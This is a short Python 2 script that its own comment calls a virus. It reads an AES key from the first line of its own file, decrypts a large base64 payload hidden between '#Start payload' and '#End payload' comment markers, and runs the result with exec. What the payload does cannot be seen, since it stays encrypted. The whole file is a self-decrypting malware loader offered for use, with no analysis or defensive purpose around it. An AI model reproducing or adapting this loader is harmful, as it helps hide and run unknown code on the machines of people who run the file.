######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
print e
exec e

sys.exit('Good job!')

#Start payload
#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
#End payload